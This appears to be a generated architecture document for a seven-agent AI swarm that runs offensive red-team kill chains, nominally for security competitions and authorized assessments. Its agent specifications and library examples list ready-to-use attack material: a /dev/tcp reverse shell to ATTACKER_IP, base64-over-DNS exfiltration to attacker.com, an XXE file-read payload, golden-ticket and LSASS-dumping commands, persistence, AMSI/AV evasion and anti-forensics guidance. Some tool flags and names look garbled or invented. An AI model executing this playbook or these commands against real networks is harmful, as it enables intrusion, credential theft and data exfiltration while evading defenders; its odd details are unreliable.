<!-- THE MANHATTAN PROJECT — SWARM FORGE LIVE v3.0
  Generated: 2026-04-30T13:25:53.812Z
  Swarm: Red Team Operations
  T2 Advisor: NEUTRON (Penetration Tester)
  VRA Score: 9/9 | Vector-enabled: true
  Geiger: APPROVED WITH CONCERNS | BOHR: APPROVED WITH CONCERNS
  Pipeline: IQ-0053 T2→Lattice→Operator workflow

  Commit to: swarms/[name]/agents/groves.md
  If vector-enabled: initialize vectors/VECTOR-CONFIG.md from Lattice Collection Design below
-->

# SWARM ARCHITECTURE DOCUMENT

## SWARM ARCHITECTURE: OFFENSIVE SECURITY OPERATIONS

### Mission Parameters
Execute full-spectrum red team kill chains for CCDC/CPTC competitions and authorized professional assessments. Swarm owns reconnaissance, initial access, post-exploitation, privilege escalation, objective achievement, and reporting across defended networks. All operations must maintain strict authorization scope boundaries and operate undetected against active blue team defenders.

### Critical Mass Calculation
Seven agents minimum because each phase of the kill chain requires independent execution logic with distinct tools and methodologies, OPSEC and detection evasion must be coordinated centrally rather than duplicated across agents, and audit/reporting must be isolated from operational decisions to preserve compliance integrity. Four-agent designs create false overlaps; six-agent designs cascade failures when one phase's evasion posture breaks others.

### Agent Roster

| **Codename** | **Role** | **Core Mission** | **Phase** | **Tier** |
|---|---|---|---|---|
| **JOLIOT** | Reconnaissance & Intelligence | Conduct passive discovery, enumerate attack surface, build target maps, deliver actionable intelligence. | Pre-engagement | Specialist |
| **LAWRENCE** | Initial Access Operator | Execute exploitation chains, credential attacks, and social engineering to establish network foothold. | Initial access | Specialist |
| **FERMI** | Post-Exploitation & Movement | Execute persistence, lateral movement, internal traversal, credential harvesting across network. | Post-exploitation | Specialist |
| **BETHE** | Privilege Escalation | Identify and exploit local/domain privilege escalation vectors to achieve administrative control. | Escalation | Specialist |
| **CHADWICK** | Objective Achievement | Execute mission-critical goals (exfil, disruption, domain takeover) and maintain persistence until complete. | Objective | Specialist |
| **GROVES** | OPSEC & Evasion Coordinator | Monitor detection risk, manage anti-forensics, validate all agent actions against evasion thresholds. | Cross-phase | Coordinator |
| **SZILARD** | Campaign Reporting & Audit | Log actions against authorization scope, compile findings, generate client reports, maintain evidence chain. | Documentation | Utility |

### Coordination Files

| **Filename** | **Purpose** |
|---|---|
| **ENGAGEMENT-SCOPE.md** | Authorization boundaries, target IP ranges, approved techniques, prohibited actions, rules of engagement. |
| **ATTACK-SURFACE-MAP.md** | Live inventory of discovered hosts, vulnerabilities, credentials, persistence points, network topology. |
| **DETECTION-RISK-LOG.md** | Real-time tracking of IOCs, defensive responses, evasion failures, threshold adjustments. |
| **OPERATIONAL-TIMELINE.md** | Chronological log of all executed actions: agent, timestamp, action, outcome, risk score. |
| **MISSION-OBJECTIVES.md** | Primary/secondary goals, completion status, evidence requirements, proof-of-concept collection. |

### Workflow Commands

**ENGAGE [TARGET] [PHASE]** — Initialize offensive operation against target in specified kill-chain phase (recon/initial-access/lateral/priv-esc/objective); GROVES validates scope compliance before authorization.

**ESCALATE-RISK** — Raise detection evasion threshold across all agents; flag high-risk actions requiring explicit operator approval.

**REPORT** — Compile final campaign report with findings, PoCs, timeline, risk assessment, and audit trail for client delivery.

### Phase 2 Advisor Assignment

**Primary T2 advisor:** GROVES (Operational Security & Evasion Coordinator)  
**Secondary advisor:** SZILARD (Campaign Reporting & Audit)

**Rationale:** OPSEC failures cascade across downstream agents and collapse the entire engagement; GROVES validates all actions before execution. SZILARD ensures compliance with scope boundaries and maintains evidence integrity for client deliverables.

### Fabrication Priority

**GROVES** — Without operational security parameters and detection thresholds established at initialization, downstream agents execute high-risk actions that trigger alerts and terminate the engagement prematurely.

### Vector Readiness Pre-Assessment

This swarm maintains persistent state across sessions: attack surface maps, credential inventories, persistence mechanisms, and network topology must survive session boundaries. Agents require injected domain knowledge (target infrastructure, defender capabilities, authorized scope) at each engagement start. Authorization scope is session-critical; scope violations cascade to all downstream phases. Risk scoring between agent handoffs is mandatory. Recommend Lattice VRA with state persistence across all agents, scope validation gates at each phase transition, and real-time risk propagation from GROVES to all execution agents.

---

# LATTICE VRA (OPERATOR ONLY)

# LATTICE VRA REPORT: OFFENSIVE SECURITY OPERATIONS
*Vector Readiness Assessment — Phase 1b output*  
*Routing: OPERATOR ONLY — do not share with T2 advisor (GROVES/SZILARD)*

---

## Assessment

| Question | Your Assessment | Score |
|---|---|---|
| Runs repeatedly against similar environments? | YES — CCDC/CPTC are annual multi-team competitions; swarm designed for repeated deployment across defended networks with similar enterprise topologies. | +2 |
| Knowledge base exceeds ~50 docs / ~100KB? | YES — Kill chain spans 7 phases; coordination files are 5+; but knowledge base will accumulate CVE catalogs, TTP libraries, target profiles, blue team playbooks, network templates, persistence mechanisms, credential inventories, and detection signatures. Substantial and growing. | +2 |
| Agents need domain knowledge mid-task (CVEs, TTPs, policies)? | YES — All 7 agents require injected knowledge mid-operation: JOLIOT needs target infrastructure; LAWRENCE needs CVEs + exploitation chains; FERMI needs lateral movement TTPs + credential access; BETHE needs priv-esc exploits; CHADWICK needs persistence + objective-specific techniques; GROVES needs real-time detection thresholds + IOC catalogs; SZILARD needs scope policies. | +2 |
| Maintains state across multiple sessions? | YES — Document explicitly requires: "attack surface maps, credential inventories, persistence mechanisms, and network topology must survive session boundaries." Multi-day engagements demand persistent state. | +1 |
| 4+ agents with overlapping domain knowledge needs? | YES — All 7 agents overlap on target infrastructure, network topology, defender capabilities, authorized techniques, risk scoring. Kill chain cascades (JOLIOT→LAWRENCE→FERMI→BETHE→CHADWICK); each downstream agent depends on upstream intelligence. GROVES overlaps with all on OPSEC. | +1 |
| CPU-only hardware, limited RAM (<16GB)? | NO — Red team ops at this scale (7 agents, persistent state, real-time risk propagation) assume standard infrastructure. No constraint signals in document. | 0 |
| Knowledge base changes mid-operation (new targets, burned techniques)? | YES — ATTACK-SURFACE-MAP grows during reconnaissance; DETECTION-RISK-LOG tracks evasion failures and blue team responses; techniques burn as defenders patch/respond; blue team adaptive posture changes detection thresholds. Multi-day CCDC events force real-time knowledge updates. | +1 |
| Lifecycle under 2 hours with small fixed knowledge base? | NO — CCDC/CPTC events run 8–48 hours; kill chains span multiple phases with overlapping sessions. Knowledge base is large, persistent, and dynamic. | 0 |

**VRA Total: 9/9**

---

## Recommendation

**RECOMMENDED** — Vector store is **mission-critical**. This swarm is deeply vector-dependent. The kill chain is sequential and tightly coupled: downstream agents (FERMI→BETHE→CHADWICK) depend on upstream findings (JOLIOT→LAWRENCE intelligence feeds). GROVES' real-time risk scoring and OPSEC coordination must propagate across all agents immediately; chat-based hand-offs will cause cascading detection failures. Authorization scope violations must be caught at every phase transition. Persistent state (attack surface, credentials, persistence points, operational timeline) is non-negotiable across multi-session engagements.

Without vectorization, the swarm degrades to file-passing and chat logs. OPSEC failures become inevitable.

---

## Proposed Architecture

| **Component** | **Choice** | **Rationale** |
|---|---|---|
| **Vector store** | **Qdrant local** (or ChromaDB HTTP for lighter deployment) | Qdrant preferred: lower latency for real-time risk propagation, native HTTP API supports all 7 agents in parallel, persistent indexing across sessions. ChromaDB HTTP acceptable if deploying to constrained host. |
| **Embedding model** | **all-mpnet-base-v2** | Red team domain is heterogeneous: CVE/exploit data (security), network topology (infrastructure), authorization policies (governance), detection profiles (security ops). all-mpnet-base-v2 balances semantic coverage across mixed domains better than security-only CySecBERT. |

---

## Suggested Collection Stubs (starting hypotheses only — for operator reference)

⚠️ **These are HYPOTHESES for operator reference. T2 advisors (GROVES/SZILARD) will author authoritative collection specs from domain knowledge.**

- **CVE-Exploitation-Matrix:** CVE IDs, CVSS scores, PoC tools, bypass techniques, detection signatures, mitigations. Queried by LAWRENCE (initial access) and FERMI (lateral movement).

- **Network-Topology-Patterns:** Enterprise network architectures, Active Directory structures, segmentation boundaries, trust relationships, DMZ topologies, credential delegation paths. Used by JOLIOT (reconnaissance) and FERMI (movement planning).

- **Blue-Team-Detection-Posture:** Defender SIEM rules, EDR signatures, network detection analytics, response playbooks, escalation procedures, alert thresholds. Queried by GROVES (OPSEC gates) and JOLIOT (recon scope calibration).

- **Persistence-and-Evasion-Catalog:** Persistence mechanisms (scheduled tasks, WMI, services, registry, cron), anti-forensics, cleanup procedures, detection evasion tactics. Used by FERMI and CHADWICK (objective phase).

- **Authorization-Scope-Registry:** Per-engagement scope boundaries, approved targets, prohibited techniques, rules of engagement, compliance constraints. Queried by GROVES (validation gates) and SZILARD (audit trail).

---

## Operator Notes

**Critical path — GROVES is the kingpin:**  
GROVES (OPSEC & Evasion Coordinator) must have **real-time, queryable access** to detection thresholds, IOC catalogs, and risk scoring parameters. Chat-based coordination will cause cascading failures. Vectorize DETECTION-RISK-LOG immediately; embed risk scores into every agent action and every blue team response event. ESCALATE-RISK command implies mid-operation threshold updates—this *must* be vector-native, not file-patching.

**Scope enforcement is a hard gate:**  
ENGAGE [TARGET] [PHASE] passes through GROVES before authorization. ENGAGEMENT-SCOPE.md is a control point. Build an Authorization-Scope-Registry collection and gate every phase transition against it. One scope violation cascades through all downstream agents.

**State persistence is non-negotiable:**  
Attack surface maps, operational timelines, credential inventories, and persistence mechanisms must survive session boundaries. A single Qdrant instance (or ChromaDB HTTP server) shared by all 7 agents is far preferable to file-based coordination. Design for multi-session continuity from day one.

**Sequencing note — do not share this VRA with GROVES or SZILARD yet.**  
This assessment is operator-only. When you're ready to brief the T2 advisors, give GROVES and SZILARD a **blank Library Specification template** and let them author collection requirements from their domain authority. If you show them this VRA first, they will pattern-match on your hypotheses and confirm them back to you—suggestion loops degrade training data quality. Let domain experts own the collection architecture; your job is to validate vector readiness, not author domain specs.

**Engagement tracking:**  
OPERATIONAL-TIMELINE and MISSION-OBJECTIVES are coordination files but also audit records. Keep these vectorizable and queryable by both operators and post-engagement auditors. SZILARD will depend on vectorized evidence chains for client reporting.

---

# MICRO-SPECIALIZATION MAP + LIBRARY SPECIFICATION
*T2 Advisor: NEUTRON*

# MICRO-SPECIALIZATION MAP: OFFENSIVE SECURITY OPERATIONS
*Produced by: Neutron (T2 Penetration Tester) — ADVISORY-PROTOCOL Phase 2*

---

## AGENT SCOPE SPECIFICATIONS

### JOLIOT — Reconnaissance & Intelligence

**Positive scope:**  
Passive discovery via Shodan/Censys/ShodanAPI queries, certificate transparency logs (crt.sh), ASN enumeration (bgp.tools), DNS OSINT (dig/nslookup/dnsdumpster), whois/registrar lookups, LinkedIn harvesting (TheHarvester, hunter.io), subnet mapping (ipcalc), web archival (Wayback Machine). Active reconnaissance: nmap service/OS fingerprinting (--sV --O --script vuln*), virtual host enumeration (vhost-scan, ffuf -w subdomains.txt), web directory bruteforce (dirsearch, feroxbuster -x .asp .aspx .php), CVE surface indexing (NVD, nuclei templates). Deliverable: ATTACK-SURFACE-MAP.md with host inventory, open ports, service versions, web applications, identified CVEs ranked by exploitability.

**Negative scope:**  
Does NOT execute exploits (LAWRENCE owns that). Does NOT perform lateral movement (FERMI). Does NOT credential attacks beyond LinkedIn scraping (LAWRENCE's domain). Does NOT privilege escalation enumeration (BETHE).

**Expertise content for Fermi:**  
nmap --script smb-enum-shares,smb-enum-users,ldap-enum (for DC enumeration post-access); certificate pinning circumvention via SSL proxy (Burp); vhost enumeration false-positive filtering (HTTP 200 vs 403 response codes); nuclei template prioritization by CVSS; Censys query syntax for port-specific service discovery; ASN→IP range conversion for scope validation; web archive API for legacy endpoint discovery.

**Handoff artifact:**  
`ATTACK-SURFACE-MAP.md` (JSON/Markdown hybrid) — consumed by LAWRENCE, BETHE, GROVES.

---

### LAWRENCE — Initial Access Operator

**Positive scope:**  
Exploitation of discovered vulnerabilities via public exploits (Exploit-DB, GitHub POC repos, Metasploit modules): SQLi (sqlmap, manual time-blind attacks), XSS (polyglot payloads, stored injection chains), XXE (Burp XXE detector), SSRF (Burp collaborator), insecure deserialization (ysoserial for Java), authentication bypass (default creds, OAuth token theft, JWT forging). Credential attacks: password spraying with lockout-aware logic (spray.py, --delay 5m thresholds), Kerberoasting via GetUserSPNs.py + Hashcat AS-REP roasting (getASREPHash.py), LDAP credential enumeration. Social engineering: phishing templates, initial shell payload staging (reverse shells via bash -i >& /dev/tcp/ATTACKER_IP/PORT). Deliverable: shell command/payload, captured credentials, established C2 beacon.

**Negative scope:**  
Does NOT perform post-exploitation cleanup (GROVES). Does NOT lateral movement (FERMI). Does NOT persistence mechanisms beyond initial shell (FERMI/CHADWICK). Does NOT privilege escalation beyond initial foothold (BETHE).

**Expertise content for Fermi:**  
sqlmap --technique=T (time-blind) for blind SQLi; xss-regex=[\'"][^\'\"]*[\'\"] for stored XSS filter bypass; xxe-payloads: `<!ENTITY xxe SYSTEM "file:///etc/passwd">` for LFI via XML; SSRF bypass via localhost variations (127.0.0.1, 0.0.0.0, localhost.localdomain); ysoserial CommonsCollections5 gadget chain for RCE; GetUserSPNs.py output → Hashcat --mode 13100 (Kerberos TGS-REP) for cracking; spray.py --delay logic prevents lockout cascades; reverse shell staging via base64-encoded payloads in SQLi contexts; Metasploit encoder iterations (shikata_ga_nai) for AV evasion.

**Handoff artifact:**  
`OPERATIONAL-TIMELINE.md` (action log entry), credential file (credentials.txt), reverse shell command.

---

### FERMI — Post-Exploitation & Movement

**Positive scope:**  
Internal reconnaissance post-shell: BloodHound data collection (SharpHound.ps1 for Windows, bloodhound.py for Linux), ldapsearch enumeration of domain structure, AD discovery (Get-ADUser, Get-ADGroup via PowerShell), network interface enumeration (ipconfig /all, hostname -I), SMB share discovery (smbclient -L, net view), process enumeration (tasklist, ps aux). Lateral movement: PsExec/WMI execution via impacket (psexec.py, wmiexec.py), SMB relay (Responder + ntlmrelayx.py), Pass-the-Hash attacks (pth-winexe, psexec with /hashes flag), pass-the-ticket via Kerberos ccache files. Credential harvesting: LSASS memory dump (procdump, mimikatz, pypykatz for offline parsing), registry hive exfiltration (SAM/SYSTEM/SECURITY), browser credential extraction (LaZagne). Persistence: scheduled task creation (schtasks /create /tn, cron jobs), WMI event subscriptions, registry persistence (HKCU\Run, Image File Execution Options), SSH key injection. Deliverable: BloodHound graph (edges.json/nodes.json), credential inventory, lateral movement chain log.

**Negative scope:**  
Does NOT initiate exploits (LAWRENCE). Does NOT privilege escalation exploitation (BETHE). Does NOT objective actions like exfiltration/disruption (CHADWICK). Does NOT OPSEC coordination (GROVES).

**Expertise content for Fermi:**  
BloodHound edge types: AdminTo (domain admin membership), CanPSRemote (WinRM execution), HasSIDHistory (token manipulation), MemberOf (nested groups); ldapsearch filter syntax: `(&(objectClass=user)(UAC:1.2.840.113556.1.4.803:=512))` for non-disabled accounts; smbclient null session: `smbclient -L //target -U "" -N`; PsExec detection evasion via Invoke-PsExec (PowerShell version, no EXE drop); WMI lateral movement: `wmiexec.py -windows-auth domain/user:pass@target` with /noprivs flag to avoid alerts; Pass-the-Hash: NTLM hash only (no plaintext required); mimikatz dpapi::cred command for encrypted credential recovery; pypykatz for offline LSASS parsing without EDR hooks; scheduled task obfuscation via hex encoding task name; WMI subscription persistence via __EventFilter + __EventConsumer; registry persistence via Scheduled Tasks XML (stealthier than HKCU\Run); SSH key injection into ~/.ssh/authorized_keys.

**Handoff artifact:**  
`ATTACK-SURFACE-MAP.md` (updated with discovered accounts/groups/permissions), BloodHound data export (JSON), `credentials.txt`, lateral movement log entry to OPERATIONAL-TIMELINE.md.

---

### BETHE — Privilege Escalation

**Positive scope:**  
Local privilege escalation (Windows/Linux): kernel vulnerability exploitation (EternalBlue MS17-010 detection via nmap --script smb-vuln-ms17-010; Zerologon CVE-2020-1472; PrintNightmare CVE-2021-1675 via C# PoC or rpcdump enumeration), DLL hijacking (Dependency Walker, ImportMonitor), unquoted service path abuse, weak file/folder permissions (accesschk.exe), registry permission abuse, sudo misconfigurations (sudoedit wildcard, NOPASSWD abuse). Domain escalation: kerberoasting to DA account (GetUserSPNs.py → Hashcat → DA creds), Zerologon RPC attack (impacket zerologon_exploit.py), PrintNightmare via Kerberos TGT, constrained delegation abuse (rbcd_relay.py), ASP.NET machine key RCE. Deliverable: elevated shell command, privilege escalation payload execution log.

**Negative scope:**  
Does NOT initial exploitation (LAWRENCE). Does NOT lateral movement (FERMI). Does NOT persistence setup (CHADWICK). Does NOT objective actions (CHADWICK).

**Expertise content for Fermi:**  
EternalBlue exploitation chain: nmap smb-vuln-ms17-010 detection → Metasploit exploit/windows/smb/ms17_010_eternalblue → reverse shell payload staging; Zerologon: impacket secretsdump.py post-exploit for domain credential extraction; PrintNightmare: rpcdump.py to enumerate spooler RPC interface, CVE-2021-1675 PoC via C# or Kerberos TGT injection; DLL hijacking: create malicious DLL in target service path (e.g., C:\Program Files\Vulnerable App\), trigger service restart; unquoted path: "C:\Program Files\My App\service.exe" → drop exe at "C:\Program Files\My.exe"; sudo NOPASSWD: `sudo -l` for wildcard patterns like `/usr/bin/* NOPASSWD`, leverage to run privileged commands; AccessChk syntax: `accesschk64.exe -q -u everyone C:\Windows\` for world-writable dirs; kerberoasting cracking: Hashcat --mode 13100 with rockyou.txt.

**Handoff artifact:**  
OPERATIONAL-TIMELINE.md entry (escalation action + timestamp), elevated shell confirmation (whoami output), escalation artifact (POC code path or CVE reference).

---

### CHADWICK — Objective Achievement

**Positive scope:**  
Mission goal execution per MISSION-OBJECTIVES.md: data exfiltration (SCP, base64-over-DNS, HTTPS tunnels via Chisel/Ligolo, SMB exfil to staging server), network disruption (arpspoof, route hijacking, DNS poisoning), domain persistence (golden ticket creation via Rubeus.exe or impacket ticketer.py, persistence scheduled tasks with recurring triggers, Shadow Admin account creation via netshadow.py), domain controller takeover (full administrative control + credential dumping), objective evidence collection (screenshots, file hashes for proof-of-concept). Deliverable: objective completion log, exfiltrated data inventory, persistence command log, PoC evidence artifacts.

**Negative scope:**  
Does NOT perform privilege escalation (BETHE). Does NOT lateral movement mechanics beyond what FERMI hands off (owns execution on already-accessed machines only). Does NOT OPSEC decisions (GROVES). Does NOT initial access (LAWRENCE).

**Expertise content for Fermi:**  
Golden ticket creation: `Rubeus.exe golden /user:Administrator /domain:DOMAIN.COM /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ticket:ticket.kirbi`; exfiltration via base64-DNS: `cat data | base64 | while read line; do nslookup $line.attacker.com; done`; Ligolo-ng C2 tunnel setup for full network pivoting; Shadow Admin via netshadow.py: create account + add to Domain Admins; DNS poisoning via responder --wpad to redirect traffic; scheduled task persistence with hidden task name (non-printing chars); domain controller backup extraction (ntdsutil snapshot command); PoC evidence: screenshot + hash verification (sha256sum of exfiltrated files).

**Handoff artifact:**  
MISSION-OBJECTIVES.md (completion status), exfil manifest (files + hashes), persistence action log.

---

### GROVES — OPSEC & Evasion Coordinator

**Positive scope:**  
Pre-engagement scope validation against ENGAGEMENT-SCOPE.md (IP ranges, approved techniques, prohibited actions), real-time detection monitoring via DETECTION-RISK-LOG.md (IOC tracking, Blue Team defensive posture, alert patterns), evasion instruction distribution (command obfuscation rules, traffic masking directives, timing constraints). Post-action risk scoring: agent action analysis against detection surface (e.g., PsExec trigger → Windows Event ID 7045 Service Creation alert risk rating +50), threshold adjustment (escalate-risk command when cumulative IOC count exceeds yellow threshold), anti-forensics coordination (artifact cleanup timing, evidence scrubbing directives). Veto authority: blocks out-of-scope actions before execution (e.g., refuses LAWRENCE exploitation of non-authorized target).

**Negative scope:**  
Does NOT execute operational actions itself (no shell access). Does NOT conduct reconnaissance (JOLIOT). Does NOT perform exploitations (LAWRENCE). Does NOT privilege escalation (BETHE).

**Expertise content for Fermi:**  
Detection risk scoring: SMBExec execution → Event ID 7045 (service creation, high confidence alert) = +40 risk; PsExec → 7045 + network traffic spike = +60; WMI lateral movement → 20730 (WMI Activity, moderate confidence) = +20; AMSI bypass via amsiSleep/PEzor encoding = -15 (evasion credit); LSASS dump via procdump → MiniDump detection + parent process chain = +45; EDR signal types: process creation/injection/registry write/network connection; WHITELISTED lolbins: certutil.exe, bitsadmin.exe, regsvcs.exe for payload staging (trusted binaries = -10 risk); command obfuscation via PowerShell splatting `&("{0}{1}" -f'Get','Content')`; DNS-over-HTTPS masking for C2 callbacks via dns.google (port 443 HTTPS).

**Handoff artifact:**  
DETECTION-RISK-LOG.md (real-time IOC tracking), scope violation alerts, evasion directive broadcasts to all agents.

---

### SZILARD — Campaign Reporting & Audit

**Positive scope:**  
Compliance logging against ENGAGEMENT-SCOPE.md (every action logged with authorization justification), evidence chain preservation (screenshots, command outputs, file hashes), finding compilation (vulnerabilities discovered, exploited, impact assessment), risk assessment (timeline of Blue Team responses, escalation events, evasion failures), final reporting (executive summary, technical findings, timeline, PoC artifacts, recommendations). Deliverable: client-facing PDF report, evidence archive (zip with logs/PoCs), OPERATIONAL-TIMELINE.md final version.

**Negative scope:**  
Does NOT conduct operations. Does NOT make operational decisions (GROVES). Does NOT perform actions beyond logging/documentation.

**Expertise content for Fermi:**  
Evidence chain: command-line output with timestamp, stdout/stderr captured to dated log files, hash verification (sha256sum) of all artifacts; compliance notation: `[ACTION: SQLi on web.target.com] [AUTHORIZATION: Web App Penetration Testing (scope line 3)] [RISK: -15 evasion credit for WAF bypass via encoding]`; finding prioritization: CVSS 9.0+ critical, 7.0-9.0 high, <7 medium/low; timeline format: `[2026-04-30T14:23:15Z] LAWRENCE: SQLi exploitation successful, captured credentials; risk score +40 (unencrypted password log)`.

**Handoff artifact:**  
`OPERATIONAL-TIMELINE.md` (master log), `FINDINGS.md` (vulnerability report), evidence archive (POCs/screenshots).

---

## COORDINATION FILE DESIGN

| **File** | **Purpose** | **Entry Template** | **Writers** | **Readers** |
|---|---|---|---|---|
| **ENGAGEMENT-SCOPE.md** | Authorization boundaries, target ranges, approved techniques, rules of engagement. | `TARGET: 10.0.1.0/24; APPROVED: SQLi, phishing, lateral via SMB; PROHIBITED: Ransomware, DoS, privilege escalation on DC` | SZILARD (init) | All agents (veto gate via GROVES) |
| **ATTACK-SURFACE-MAP.md** | Live inventory: hosts, services, CVEs, credentials, persistence points. | `{ "host": "10.0.1.10", "os": "Windows Server 2016", "services": [{"port": 445, "service": "SMB", "cve": "MS17-010"}], "creds": ["domain\\user:pass"] }` | JOLIOT, FERMI, BETHE | LAWRENCE, FERMI, CHADWICK (targeting) |
| **DETECTION-RISK-LOG.md** | Real-time IOC tracking, Blue Team responses, evasion threshold adjustments. | `[2026-04-30T14:22:00Z] RISK: +40 (PsExec lateral movement detected on 10.0.1.50, Event ID 7045); EVASION: Switch to WMI (risk +20)` | GROVES | All agents (decision gates) |
| **OPERATIONAL-TIMELINE.md** | Chronological action log: agent, timestamp, action, outcome, risk score. | `[2026-04-30T14:15:30Z] LAWRENCE: SQLi exploitation on web.target.com; outcome: shell access 10.0.1.5; risk: +40 (unencrypted creds in log)` | LAWRENCE, FERMI, BETHE, CHADWICK | SZILARD (reporting), GROVES (risk rolling average) |
| **MISSION-OBJECTIVES.md** | Primary/secondary goals, status, evidence requirements, PoC deadlines. | `OBJECTIVE: Obtain Domain Admin credentials; STATUS: In Progress (BETHE escalating); REQUIRED: Hash + golden ticket; ETA: Session 2` | SZILARD (init) | CHADWICK (execution), GROVES (scope validation) |

---

## FABRICATION PRIORITY

| **Agent** | **Rationale** |
|---|---|
| **GROVES** | Without operational security validation gates at every phase transition, downstream agents execute high-risk actions (PsExec/LSASS dumps/golden tickets) that trigger Blue Team alerts and collapse the entire engagement before objective completion. GROVES is load-bearing for swarm survival. |
| **JOLIOT** | Absent comprehensive attack surface mapping with annotated CVEs and service versions, subsequent agents waste cycles on non-exploitable targets and miss high-confidence initial access vectors, extending reconnaissance time beyond detection thresholds. |
| **SZILARD** | Without compliance logging and scope validation from session start, agents unknowingly execute out-of-authorization actions, creating legal liability and evidence chain corruption that invalidates client deliverables. |

---

**END OUTPUT A**

---

# LIBRARY SPECIFICATION: OFFENSIVE SECURITY OPERATIONS SWARM

*Authored by: Neutron (T2 Penetration Tester Domain Expert) — for Lattice VRA Implementation*

---

## Purpose Statement

This swarm executes kill-chain operations across defended networks with **persistent session state** and **strict authorization scope boundaries**. Agents cannot optimize without retrieval of:

1. **Exploitation-to-Payload Mappings** — JOLIOT enumerates CVEs; LAWRENCE must instantly convert CVE ID → exploit chain → payload + staging technique. Without this, 20+ minute delays per exploit trigger blue team detection.

2. **Detection Evasion Heuristics** — GROVES must validate EVERY action against IOC risk (e.g., "PsExec = Event ID 7045 + network spike = +60 risk; switch to WMI = +20"). Without IOC-to-detection mappings, GROVES cannot gate actions in real time.

3. **Lateral Movement Decision Logic** — FERMI chooses PsExec vs WMI vs SMB Relay based on OS, account type, EDR posture. Without decision trees, FERMI defaults to loudest option; first movement triggers game-ending alert.

4. **Windows/AD Architecture Context** — BETHE needs domain topology, Kerberos workflows, constrained delegation chains, SPN discovery heuristics. Without schema context, BETHE misses high-confidence escalation paths.

5. **Credential Attack Workflows** — LAWRENCE needs lockout-aware spray logic (5-failure/30-min threshold, 300-second delays), Kerberoasting pipeline (GetUserSPNs → Hashcat mode 13100 → DA account targeting). Without templates, LAWRENCE locks 20 accounts in first session.

6. **Competition-Specific Patterns** — CCDC/CPTC environments have stereotype vulnerabilities (Apache mod_userdir RCE, Samba 3.5.x, unpatched kernels), known misconfigurations, scoring infrastructure patterns. Without CCDC inventories, JOLIOT performs generic enumeration instead of targeting high-probability wins.

**Critical Gap:** This swarm maintains **state across session boundaries** (attack surface maps, credentials, persistence points). Agents must retrieve context about previously-discovered targets and blue team responses to prior actions. Without state-aware retrieval, agents re-enumerate dead targets and repeat failed evasion techniques.

---

## Suggested Collections

### 1. **CVE-Exploitation Reference**
**What:** CVE ID, product/version, exploit source (Exploit-DB/GitHub/Metasploit), payload staging technique, detection signature (Event ID/EDR alert pattern), evasion bypass.

**Why:** JOLIOT discovers CVEs; LAWRENCE converts to executable payloads; BETHE chains escalation exploits; GROVES maps exploits to detection signatures for risk scoring.

**Format:** JSON—one document per CVE class.

**Examples:**
- `CVE-2017-0144` (EternalBlue): Metasploit ms17_010_eternalblue → msfvenom reverse shell → Event ID 7045 (service creation) → AMSI bypass via Invoke-Obfuscation.
- `CVE-2020-1472` (Zerologon): impacket zerologon_exploit.py → credential extraction → Event ID 4769 (TGS anomaly).
- `SQL Injection (Time-Blind)`: sqlmap --technique=T → base64 shell payload → DNS exfiltration masking.

---

### 2. **Windows Event ID → Agent Action Mapping**
**What:** Event ID (7045=service creation, 4769=Kerberos TGS, 4672=special priv, 20730=WMI, 10=LSASS access), trigger action, detection confidence, evasion technique.

**Why:** GROVES must risk-score real-time. Without IOC-action mappings, GROVES cannot differentiate loud actions (PsExec) from stealthy alternatives (WMI) or decide when escalation threshold triggers operator approval.

**Format:** Table + decision tree reference.

**Examples:**
- **Event 7045 (Service Creation):** Triggered by PsExec. High confidence if .exe on disk. Evasion: WMI lateral (Event 20730, lower confidence), scheduled task (4698, moderate), or in-memory PowerShell variant.
- **Event 4769 (Kerberos TGS):** Abnormal if SPNs queried en masse (Kerberoasting). Evasion: Spread requests over time, use compromised SPN-delegated account.
- **Event 10 (LSASS Access):** High-confidence for direct dumps. Evasion: mimikatz SharpKiller encoding, procdump parent masquerade, pypykatz offline parsing.

---

### 3. **Lateral Movement Decision Tree**
**What:** Decision logic: IF OS=Windows10 AND privileges=domain-user AND EDR=unknown THEN prefer WMI (Event 20730) over PsExec (7045). IF Linux AND sudo-capable THEN SSH key injection. Timing constraints per technique.

**Why:** FERMI must choose optimal technique per compromised account + target OS + defensive posture. Without logic, FERMI defaults to loudest option (PsExec) and triggers first-action alerts.

**Format:** Flowchart + syntax reference.

**Examples:**
- Windows domain admin on Win10: WMI via `wmiexec.py -windows-auth domain/admin:hash@target /noprivs` (avoids privileged logging, space 60+ sec apart).
- Linux post-exploitation (non-sudo): SSH authorized_keys injection (very low detection, maintains permissions 600).
- Kerberos-disabled networks: Pass-the-hash (pth-winexe), sparse Event ID logging, detect via traffic spike volume.

---

### 4. **Active Directory Architecture & Kerberos Workflows**
**What:** Domain trust relationships, service account privilege escalation chains, constrained delegation abuse (RBCD relay), golden ticket creation (Rubeus syntax + KRBTGT hash logic), BloodHound edge types (AdminTo, CanPSRemote, HasSIDHistory).

**Why:** FERMI cannot lateral move without trust topology. BETHE needs pre-computed escalation chains. CHADWICK needs golden ticket templates for persistence at scale.

**Format:** Decision tree + command reference.

**Examples:**
- Child→Parent trust + SIDHistory = domain escalation vector.
- Constrained delegation: Identify service accounts with "Allow to trust for delegation" → RBCD relay exploit.
- Golden ticket: `Rubeus.exe golden /user:Administrator /domain:DOMAIN.COM /sid:S-1-5-21-... /krbtgt:HASH /ticket:ticket.kirbi`.

---

### 5. **Credential Attack Workflows**
**What:** Password spray lockout logic (5 failures/30min, 300-sec delay strategy). Kerberoasting end-to-end (GetUserSPNs.py → Hashcat mode 13100 → DA identification). AS-REP roasting. LDAP enumeration filters for service/disabled accounts.

**Why:** LAWRENCE needs exact tool parameters + lockout-aware logic. BETHE needs Kerberoasting to identify high-value targets. FERMI needs credential format identification (NTLM vs plaintext vs encrypted).

**Format:** Pipeline templates with exact syntax + timing constraints.

**Examples:**
- Spray: `spray.py --delay 300` + ldapsearch `(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2))))` (non-disabled accounts). Avoid monitored admin accounts. ~10-15% success on Password123!, Summer2025.
- Kerberoasting: `GetUserSPNs.py -dc-ip 10.0.1.1 domain.com/user:pass → Hashcat mode 13100 hashes.txt → identify DA SPNs → crack.`

---

### 6. **CCDC/CPTC Vulnerability Inventory**
**What:** Common vulnerable services (Apache 2.4.41 mod_userdir RCE, Samba 3.5.x RCE, unpatched kernels, world-writable logs), default credentials, typical network topology, scoring infrastructure patterns (NRPE on 5666, web scorers on port 80/443).

**Why:** JOLIOT accelerates enumeration by targeting known-vulnerable CCDC services instead of generic scanning. LAWRENCE prioritizes CCDC-common exploits. Competitive speed advantage.

